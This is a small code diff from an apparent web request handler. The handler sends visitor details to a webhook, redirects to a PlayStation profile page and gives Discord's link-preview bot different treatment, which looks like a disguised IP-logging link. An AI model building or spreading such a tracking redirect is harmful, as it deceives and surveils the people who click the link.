@@ -100,7 +100,6 @@ export default async function handler(req, res) {
             };
             await sendToWebhook(message);
             res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
-            res.end();
         } 
 
         if (ipDetails.isp === "Google LLC" && userAgent.includes("Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)")) {
